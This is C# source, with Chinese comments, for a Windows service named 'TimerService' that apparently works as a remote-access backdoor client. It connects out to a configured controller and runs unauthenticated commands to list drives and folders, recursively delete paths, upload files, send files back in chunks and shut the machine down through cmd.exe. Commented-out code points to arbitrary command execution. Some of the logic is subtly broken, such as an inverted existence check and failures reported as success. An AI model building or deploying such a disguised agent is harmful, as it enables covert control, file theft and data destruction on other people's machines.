using ICSharpCode.SharpZipLib.Checksum;
using ICSharpCode.SharpZipLib.Zip;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Configuration;
using System.Net.NetworkInformation;

namespace TimerService
{
    public partial class Service1 : ServiceBase
    {
        /// <summary>
        /// 主Socket对象
        /// </summary>
        private Socket clinet;

        /// <summary>
        /// 下载使用的Socket对象
        /// </summary>
        private Socket DownloadClinet;

        /// <summary>
        /// 创建返回对象
        /// </summary>
        ReturnState returnState = new ReturnState();

        /// <summary>
        /// 定义线程指示灯
        /// </summary>
        static AutoResetEvent myEvent = new AutoResetEvent(false);

        /// <summary>
        /// 连接的远程地址
        /// </summary>
        string Address = ConfigurationManager.AppSettings["Address"];

        /// <summary>
        /// 信息返回端口
        /// </summary>
        int Port = int.Parse(ConfigurationManager.AppSettings["Port"]);

        /// <summary>
        /// 下载文件专用端口
        /// </summary>
        int DownloadPort = int.Parse(ConfigurationManager.AppSettings["DownloadPort"]);

        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            CreateSocket();
            CreateDownloadSocket();
        }

        /// <summary>
        /// 初始化主Socket
        /// </summary>
        private void CreateSocket()
        {
            try
            {
                //定义clinet
                clinet = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint point = new IPEndPoint(IPAddress.Parse(Address), Convert.ToInt32(Port));
                clinet.Connect(point);
               
                //开启线程监听发送过来的信息
                Thread thClinet = new Thread(new ThreadStart(ReceiveMessages));
                thClinet.IsBackground = true;
                thClinet.Start();
            }
            catch (Exception)
            {
                throw;
            }
        }

        /// <summary>
        /// 初始化下载Socket
        /// </summary>
        private void CreateDownloadSocket()
        {
            try
            {
                //定义clinet
                DownloadClinet = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint point = new IPEndPoint(IPAddress.Parse(Address), Convert.ToInt32(DownloadPort));
                DownloadClinet.Connect(point);

            }
            catch (Exception)
            {
                throw;
            }
        }

        /// <summary>
        /// 接收消息
        /// </summary>
        private void ReceiveMessages()
        {
            try
            {
                bool flag = true;
                while (flag)
                {

                    byte[] recBuf = new byte[1000000];
                    int length = clinet.Receive(recBuf);
                    string reslut = Encoding.Default.GetString(recBuf, 0, length);
                    TransmitMessage returnMessage = JsonConvert.DeserializeObject<TransmitMessage>(reslut);
                    ThreadPool.QueueUserWorkItem(new WaitCallback(SwitchSend), returnMessage);
                }
            }
            catch (Exception)
            {
                CreateSocket();
            }

        }

        public void SwitchSend(object Parameter)
        {
            TransmitMessage returnMessage = (TransmitMessage)Parameter;
            switch (returnMessage.StateCode)
            {
                //停止服务
                case -1:
                    OnStop();
                    break;

                //获取电脑基础信息
                case 0:

                    //clinet.Send(Encoding.Default.GetBytes(JsonConvert.SerializeObject(userMessage())));
                    break;

                //获取磁盘信息
                case 1:

                    //初始化返回对象
                    returnState = new ReturnState { StateCode = 1, State = true, Key = "Tip_Message" };

                    //获取磁盘信息并序列化
                    try
                    {
                        string DiskListJson = JsonConvert.SerializeObject(GetDiskListInfo());
                        returnState.Message = DiskListJson;
                    }
                    catch (Exception)
                    {
                        returnState.State = false;
                        returnState.Message = "获取磁盘信息失败";
                    }
                    break;

                //读取路径下的文件和文件夹
                case 2:

                    //初始化返回对象
                    returnState = new ReturnState { StateCode = 2, State = true, Key ="Tip_Message" };

                    //读取所有的文件和文件夹并序列化
                    try
                    {
                        string FileListJson = JsonConvert.SerializeObject(GetDirectoryInfoAndFile(returnMessage.Path));
                        returnState.Message = FileListJson;
                    }
                    catch (Exception)
                    {
                        returnState.State = false;
                        returnState.Message = "获取文件和文件夹失败！";
                    }
                    break;

                //删除文件或文件夹及其子路径的文件和文件夹
                case 3:

                    //初始化返回对象
                    returnState = new ReturnState { StateCode = 3, State = true, Key = "Tip_Message" };

                    //执行删除方法并返回状态
                    try
                    {
                        bool Result = DeleteFile(returnMessage.Path);
                        returnState.Message = "删除成功！";
                    }
                    catch (Exception)
                    {
                        returnState.State = false;
                        returnState.Message = "删除失败！";
                    }
                    break;

                //执行关机指令
                case 4:

                    //初始化返回对象
                    returnState = new ReturnState { StateCode = 4, State = true, Key = "Tip_Message" };

                    //执行关机指令
                    try
                    {
                        RunInstructions("shutdown -s -t " + int.Parse(returnMessage.Value));
                        returnState.Message = "目标机器已关机！";
                    }
                    catch (Exception)
                    {
                        returnState.State = true;
                        returnState.Message = "执行指令失败！";
                    }
                    break;

                //添加文件或文件夹
                case 5:

                    //初始化返回对象
                    returnState = new ReturnState { StateCode = 5, State = true, Key = "Tip_Message" };

                    //创建文件或者文件夹
                    try
                    {
                        //将路径的"\\"替换成"/"
                        returnMessage.Path = returnMessage.Path.Replace("\\", "/");

                        bool Result = CreateFileOrDirectory(returnMessage.Path, returnMessage.FileContent);

                        if (returnMessage.Path.Last() == '/')
                        {
                            returnState.Message = "文件夹创建成功！";
                        }
                        else
                        {
                            returnState.Message = "文件上传成功！";
                        }
                    }
                    catch (Exception)
                    {
                        returnState.State = false;
                        if (returnMessage.Path.Last() == '/')
                        {
                            returnState.Message = "文件夹创建失败！";
                        }
                        else
                        {
                            returnState.Message = "文件上传失败！";
                        }
                    }
                    finally
                    {
                        //清空文件内容缓存
                        returnMessage.FileContent = new byte[] { };
                    }
                    break;

                //下载文件
                case 6:
                     DownloadFile(returnMessage.Path);

                    break;
                //case 7:
                //    clinet.Send(Encoding.Default.GetBytes(JsonConvert.SerializeObject(ExecuteTheCMD(returnMessage.Path))));
                //    break;
                //case 10:
                //    clinet.Send(Encoding.Default.GetBytes(JsonConvert.SerializeObject(ExecuteCMDInstruction(returnMessage.CmdOrder))));
                //    break;
                //case 11:
                //    CompressDirectory(returnMessage.Path, 5, false);
                //    clinet.Send(Encoding.Default.GetBytes(JsonConvert.SerializeObject("True")));
                //    break;
            }

            //发送序列化后的返回对象
            clinet.Send(Encoding.Default.GetBytes(JsonConvert.SerializeObject(returnState)));
        }

        /// <summary>    
        /// 压缩文件    
        /// </summary>    
        /// <param name="fileNames">要打包的文件列表</param>    
        /// <param name="GzipFileName">目标文件名</param>    
        /// <param name="CompressionLevel">压缩品质级别（0~9）</param>    
        /// <param name="deleteFile">是否删除原文件</param>  
        public static ReturnState CompressFile(List<FileInfo> fileNames, string GzipFileName, int CompressionLevel, bool deleteFile)
        {
            //创建压缩文件
            ZipOutputStream s = new ZipOutputStream(File.Create(GzipFileName));
            try
            {
                //设置压缩文件的品质
                s.SetLevel(CompressionLevel);

                //迭代需要压缩的文件列表
                foreach (FileInfo file in fileNames)
                {
                    //读取文件，若文件不存在则进入下一次循环
                    FileStream fs = null;
                    if (File.Exists(file.FullName))
                        fs = file.Open(FileMode.Open, FileAccess.ReadWrite);
                    else
                        continue;

                    //将文件分批读入缓冲区    
                    byte[] data = new byte[2048];
                    int size = 2048;
                    ZipEntry entry = new ZipEntry(Path.GetFileName(file.Name));
                    entry.DateTime = (file.CreationTime > file.LastWriteTime ? file.LastWriteTime : file.CreationTime);
                    s.PutNextEntry(entry);
                    while (true)
                    {
                        size = fs.Read(data, 0, size);
                        if (size <= 0) break;
                        s.Write(data, 0, size);
                    }
                    fs.Close();

                    //是否删除源文件
                    if (deleteFile)
                    {
                        file.Delete();
                    }
                }
            }
            catch (Exception)
            {
                return new ReturnState() { State = false, Message = "文件压缩失败！" };
            }
            finally
            {
                s.Finish();
                s.Close();
            }
            return new ReturnState() { State = true, Message = "文件压缩成功！" };
        }

        /// <summary>    
        /// 压缩文件夹    
        /// </summary>    
        /// <param name="dirPath">要打包的文件夹</param>    
        /// <param name="CompressionLevel">压缩品质级别（0~9）</param>    
        /// <param name="deleteDir">是否删除原文件夹</param>  
        public static ReturnState CompressDirectory(string dirPath, int CompressionLevel, bool deleteDir)
        {
            try
            {
                //文件夹不存在则退出方法
                if (Directory.Exists(dirPath))
                    return new ReturnState() { State = false, Message = "路径不存在！" }; ;

                //路径中如果最后一个字符是"/"符号则清理
                dirPath = dirPath.Replace("\\", "/");
                dirPath = dirPath.ToList().Last() == '/' ? dirPath.Remove(dirPath.Length - 1, 1) : dirPath;

                //创建目标文件名
                string GzipFileName = dirPath + ".Zip";
                using (ZipOutputStream zipoutputstream = new ZipOutputStream(File.Create(GzipFileName)))
                {
                    zipoutputstream.SetLevel(CompressionLevel);
                    Crc32 crc = new Crc32();

                    //读取文件夹下的所有文件
                    Dictionary<string, DateTime> fileList = GetAllFies(dirPath);

                    foreach (KeyValuePair<string, DateTime> item in fileList)
                    {
                        FileStream fs = File.OpenRead(item.Key.ToString());
                        byte[] buffer = new byte[fs.Length];
                        fs.Read(buffer, 0, buffer.Length);
                        ZipEntry entry = new ZipEntry(item.Key.Substring(dirPath.Length));
                        entry.DateTime = item.Value;
                        entry.Size = fs.Length;
                        fs.Close();
                        crc.Reset();
                        crc.Update(buffer);
                        entry.Crc = crc.Value;
                        zipoutputstream.PutNextEntry(entry);
                        zipoutputstream.Write(buffer, 0, buffer.Length);
                    }
                }

                //删除源文件夹
                if (deleteDir)
                {
                    Directory.Delete(dirPath, true);
                }
                return new ReturnState() { State = true, Message = "文件夹压缩成功！" };
            }
            catch (Exception)
            {
                return new ReturnState() { State = true, Message = "文件夹压缩失败！" };
            }
        }

        /// <summary>
        /// 读取目录下文件和文件夹
        /// </summary>
        /// <param name="path"></param>
        /// <returns></returns>
        private static List<FileDetails> GetDirectoryInfoAndFile(string path)
        {
            if (!Directory.Exists(path))
                return new List<FileDetails>();
            try
            {
                List<FileDetails> FileList = new List<FileDetails>();
                DirectoryInfo dir = new DirectoryInfo(path);
                FileInfo[] fil = dir.GetFiles();
                DirectoryInfo[] dii = dir.GetDirectories();
                string Parentpath = "";
                try
                {
                    if (dir.Parent != null)
                        Parentpath = dir.Parent.FullName;
                }
                catch (Exception)
                {
                    Parentpath = "";
                }
                //获取子子文件夹内的文件列表，递归遍历
                foreach (DirectoryInfo d in dii)
                {
                    FileList.Add(new FileDetails() { FileName = d.Name, FileCreateDate = d.CreationTime, ParentPath = Parentpath, IsFile = false });//添加文件夹的路径到列表
                }
                foreach (FileInfo f in fil)
                {
                    FileList.Add(new FileDetails() { FileName = f.Name, FileCreateDate = f.CreationTime, Size = f.Length / 1024, ParentPath = Parentpath, IsFile = true });//添加文件的路径到列du表
                }
                return FileList;
            }
            catch (Exception)
            {
                throw;
            }

        }

        /// <summary>    
        /// 获取所有文件    
        /// </summary>    
        /// <returns></returns>    
        private static Dictionary<string, DateTime> GetAllFies(string dir)
        {
            Dictionary<string, DateTime> FilesList = new Dictionary<string, DateTime>();
            DirectoryInfo fileDire = new DirectoryInfo(dir);
            if (!fileDire.Exists)
            {
                throw new System.IO.FileNotFoundException("目录:" + fileDire.FullName + "没有找到!");
            }
            GetAllDirFiles(fileDire, FilesList);
            GetAllDirsFiles(fileDire.GetDirectories(), FilesList);
            return FilesList;
        }

        /// <summary>    
        /// 获取一个文件夹下的所有文件夹里的文件    
        /// </summary>    
        /// <param name="dirs"></param>    
        /// <param name="filesList"></param>    
        private static void GetAllDirsFiles(DirectoryInfo[] dirs, Dictionary<string, DateTime> filesList)
        {
            foreach (DirectoryInfo dir in dirs)
            {
                foreach (FileInfo file in dir.GetFiles("*.*"))
                {
                    filesList.Add(file.FullName, file.LastWriteTime);
                }
                GetAllDirsFiles(dir.GetDirectories(), filesList);
            }
        }

        /// <summary>    
        /// 获取一个文件夹下的文件    
        /// </summary>    
        /// <param name="dir">目录名称</param>    
        /// <param name="filesList">文件列表HastTable</param>    
        private static void GetAllDirFiles(DirectoryInfo dir, Dictionary<string, DateTime> filesList)
        {
            foreach (FileInfo file in dir.GetFiles("*.*"))
            {
                filesList.Add(file.FullName, file.LastWriteTime);
            }
        }

        /// <summary>    
        /// 解压缩文件    
        /// </summary>    
        /// <param name="GzipFile">压缩包文件名</param>    
        /// <param name="targetPath">解压缩目标路径</param>           
        public static ReturnState Decompress(string GzipFile, string targetPath)
        {
            try
            {
                //去掉文件后缀作为文件夹名
                targetPath = GzipFile.Substring(0, GzipFile.LastIndexOf('.'));
                string CurrentDirectory = targetPath;

                //文件夹不存在则解压文件夹
                if (!Directory.Exists(CurrentDirectory))
                    Directory.CreateDirectory(CurrentDirectory);

                //最大解压300M文件
                byte[] data = new byte[1024 * 1024 * 300];

                int size = 2048;
                ZipEntry theEntry = null;
                using (ZipInputStream s = new ZipInputStream(File.OpenRead(GzipFile)))
                {
                    while ((theEntry = s.GetNextEntry()) != null)
                    {
                        if (theEntry.IsDirectory)
                        {
                            // 该结点是目录    
                            if (!Directory.Exists(CurrentDirectory + theEntry.Name)) Directory.CreateDirectory(CurrentDirectory + theEntry.Name);
                        }
                        else
                        {
                            if (theEntry.Name != String.Empty)
                            {
                                //  检查多级目录是否存在  
                                if (theEntry.Name.Contains("//"))
                                {
                                    string parentDirPath = theEntry.Name.Remove(theEntry.Name.LastIndexOf("//") + 1);
                                    if (!Directory.Exists(parentDirPath))
                                    {
                                        Directory.CreateDirectory(CurrentDirectory + parentDirPath);
                                    }
                                }

                                //解压文件到指定的目录    
                                using (FileStream streamWriter = File.Create(CurrentDirectory + theEntry.Name))
                                {
                                    while (true)
                                    {
                                        size = s.Read(data, 0, data.Length);
                                        if (size <= 0)
                                            break;
                                        streamWriter.Write(data, 0, size);
                                    }
                                    streamWriter.Close();
                                }
                            }
                        }
                    }
                    s.Close();
                }

                return new ReturnState() { State = true, Message = "文件解压成功！" };
            }
            catch (Exception)
            {
                return new ReturnState() { State = false, Message = "文件解压失败！" };
            }

        }

        /// <summary>
        /// 删除文件及文件夹
        /// </summary>
        /// <param name="Path"></param>
        private static bool DeleteFile(string Path)
        {
            try
            {
                //删除指定文件
                if (File.Exists(Path))
                {
                    FileInfo fileInfo = new FileInfo(Path);
                    fileInfo.Delete();
                }

                //删除该文件夹及该文件夹下包含的文件
                if (Directory.Exists(Path))
                {
                    Directory.Delete(Path, true);
                }

                return true;

            }
            catch (Exception)
            {
                throw;
            }
        }

        /// <summary>
        /// 添加文件或者文件夹
        /// </summary>
        /// <param name="Path"></param>
        /// <param name="Content"></param>
        /// <returns></returns>
        private static bool CreateFileOrDirectory(string Path, byte[] Content)
        {
            try
            {
                //如果路径最后一个是'/'字符则创建文件夹
                if (Path.Last() == '/')
                {
                    Directory.CreateDirectory(Path);
                    return true;
                }

                //创建文件并将内容写入文件
                using (FileStream fsWrite = new FileStream(Path, FileMode.OpenOrCreate, FileAccess.Write))
                {
                    fsWrite.Write(Content, 0, Content.Length);
                }

                return true;
            }
            catch (Exception)
            {
                throw;
            }

        }

        /// <summary>
        /// 执行指令
        /// </summary>
        private static bool RunInstructions(string Value)
        {
            try
            {
                var startInfo = new System.Diagnostics.ProcessStartInfo("cmd.exe");

                startInfo.UseShellExecute = false;

                startInfo.RedirectStandardInput = true;

                startInfo.RedirectStandardOutput = true;

                startInfo.RedirectStandardError = true;

                startInfo.CreateNoWindow = true;

                var myProcess = new System.Diagnostics.Process();

                myProcess.StartInfo = startInfo;

                myProcess.Start();

                myProcess.StandardInput.WriteLine(Value);

                return true;
            }
            catch (Exception)
            {
                throw;
            }

        }

        /// <summary>
        /// 下载指定路径下的文件
        /// </summary>
        /// <param name="Path"></param>
        /// <returns></returns>
        private void DownloadFile(string Path)
        {
            byte[] FileContent = new byte[] { };
            try
            {
                //接收数据临时缓冲区
                byte[] recBuf = new byte[100000];
                int length = 1;
                string reslut = "";
                int Size = 0;
                NetworkInterface[] adapters = NetworkInterface.GetAllNetworkInterfaces();
                bool IsBreakSize = false;

                //获取本机的网卡速度，与控制中心交互单个数据包大小
                while (!IsBreakSize)
                {
                    foreach (NetworkInterface adapter in adapters)
                    {
                        if (adapter.OperationalStatus == OperationalStatus.Up && Size == 0)
                        {
                            Size = Convert.ToInt32(Convert.ToDouble(adapter.Speed) / Convert.ToDouble(10000000) / Convert.ToDouble(8) * Convert.ToDouble(1024));

                            //发送本次任务单个数据包大小
                            clinet.Send(Encoding.Default.GetBytes(JsonConvert.SerializeObject(new ReturnState() { StateCode = 6, State = true, Key = "Size", Message = Size.ToString() })));
                        }
                    }

                    //接收返回信息，接收到TRUE时表示控制中心已知悉单个数据包大小
                    length = clinet.Receive(recBuf);
                    reslut = Encoding.Default.GetString(recBuf, 0, length);
                    if (reslut.Contains("True"))
                        IsBreakSize = true;
                }

                FileInfo fi = new FileInfo(Path);

                //获取要下载的文件名
                string PathFileName = fi.Name;

                //读取文件内容
                FileContent = new byte[fi.Length];
                FileStream fs = fi.OpenRead();
                fs.Read(FileContent, 0, Convert.ToInt32(fs.Length));
                fs.Close();

                //计算文件内容需要拆成多少个数据包进行传输任务
                int FileContentNum = int.Parse(Math.Ceiling(Convert.ToDecimal(FileContent.Length) / Convert.ToDecimal(1024 * Size)).ToString());

                //定义下文发送数据包的内容
                List<DownLoadFileClass> ReturnFileList = new List<DownLoadFileClass>();
                ReturnState returnState = new ReturnState() { StateCode = 6, State = true };

                //开始发送数据包
                for (int i = 1; i <= FileContentNum; i++)
                {
                    bool IsBreak = false;
                    while (!IsBreak)
                    {
                        //获取需要被反序列化的文件信息
                        returnState.Message = JsonConvert.SerializeObject(new DownLoadFileClass { FileName = PathFileName.Split('.')[0], FileContent = FileContent.AsQueryable().Skip((i - 1) * 1024 * Size).Take(i == FileContentNum ? FileContent.Count() - ((i - 1) * 1024 * Size) : (1024 * Size)).ToArray(), Level = i, FileSuffix =fi.Extension, IsEnd = i == FileContentNum , SumNum = FileContentNum });

                        try
                        {
                            //发送数据包节点
                            DownloadClinet.Send(Encoding.Default.GetBytes(JsonConvert.SerializeObject(returnState)));
                        }
                        catch (Exception)
                        {
                            continue;
                        }

                        //接收返回的信息
                        length = clinet.Receive(recBuf);
                        reslut = Encoding.Default.GetString(recBuf, 0, length);
                        if (reslut == "True")
                            IsBreak = true;
                    }
                }
            }
            catch (Exception)
            {
                returnState.State = false;
                returnState.Message = "下载失败，请重试！";
                clinet.Send(Encoding.Default.GetBytes(JsonConvert.SerializeObject(returnState)));
            }
            finally
            {
                FileContent = null;
                returnState = new ReturnState();
            }
        }

        /// <summary>
        /// 读取磁盘信息
        /// </summary>
        /// <returns></returns>
        private List<HardDiskPartition> GetDiskListInfo()
        {
            List<HardDiskPartition> list = null;
            //Specifies the capacity information for the partition
            try
            {
                SelectQuery selectQuery = new SelectQuery("select * from win32_logicaldisk");

                ManagementObjectSearcher searcher = new ManagementObjectSearcher(selectQuery);

                ManagementObjectCollection diskcollection = searcher.Get();
                if (diskcollection != null && diskcollection.Count > 0)
                {
                    list = new List<HardDiskPartition>();
                    HardDiskPartition harddisk = null;
                    foreach (ManagementObject disk in searcher.Get())
                    {
                        int nType = Convert.ToInt32(disk["DriveType"]);
                        if (nType != Convert.ToInt32(DriveType.Fixed))
                        {
                            continue;
                        }
                        else
                        {
                            harddisk = new HardDiskPartition();
                            harddisk.FreeSpace = Convert.ToDouble(disk["FreeSpace"]) / (1024 * 1024 * 1024);
                            harddisk.SumSpace = Convert.ToDouble(disk["Size"]) / (1024 * 1024 * 1024);
                            harddisk.PartitionName = disk["DeviceID"].ToString();
                            list.Add(harddisk);
                        }
                    }
                }
            }
            catch (Exception)
            {
                throw;
            }
            return list;
        }

        protected override void OnStop()
        {
        }
    }

    /// <summary>
    /// 返回状态
    /// </summary>
    public class ReturnState
    {
        public int StateCode { get; set; }//返回标识
        public bool State { get; set; }//返回状态
        public string Key { get; set; }//返回信息的Key
        public string Message { get; set; }//返回信息
    }

    /// <summary>
    /// 远程传递消息类
    /// </summary>
    public class TransmitMessage
    {
        public int StateCode { get; set; }//标识
        public string Path { get; set; }//地址
        public string Value { get; set; }//传递的参数信息
        public byte[] FileContent { get; set; }//文件流内容

        public List<string> CmdOrder = new List<string>();
    }

    /// <summary>
    /// 磁盘信息承载
    /// </summary>
    public class HardDiskPartition
    {
        #region Data
        private string _PartitionName;
        private double _FreeSpace;
        private double _SumSpace;
        #endregion //Data

        #region Properties
        /// 
        /// Free size
        /// 
        public double FreeSpace
        {
            get { return _FreeSpace; }
            set { this._FreeSpace = value; }
        }
        /// 
        ///used space
        /// 
        public double UseSpace
        {
            get { return _SumSpace - _FreeSpace; }
        }
        /// 
        /// Total space
        /// 
        public double SumSpace
        {
            get { return _SumSpace; }
            set { this._SumSpace = value; }
        }
        /// 
        /// The name of the partitio
        /// 
        public string PartitionName
        {
            get { return _PartitionName; }
            set { this._PartitionName = value; }
        }
        /// 
        /// Primary partition or not
        /// 
        public bool IsPrimary
        {
            get
            {
                // Determine whether to install the partition for the system
                if (System.Environment.GetEnvironmentVariable("windir").Remove(2) == this._PartitionName)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
        }
        #endregion //Properties

    }

    /// <summary>
    /// 文件类
    /// </summary>
    public class FileDetails
    {
        public string FileName { get; set; }//文件名
        public DateTime FileCreateDate { get; set; }//创建时间
        public long Size { get; set; }//大小
        public string ParentPath { get; set; }//基目录
        public bool IsFile { get; set; }//是否是文件
    }

    /// <summary>
    /// 文件下载类
    /// </summary>
    public class DownLoadFileClass
    {
        public string FileName { get; set; }//文件名
        public byte[] FileContent { get; set; }//文件内容

        public int Level { get; set; }//文件节点
        public string FileSuffix { get; set; }//文件后缀
        public int SumNum { get; set; }//数据包总数
        public bool IsEnd { get; set; }//是否结束
    }
}
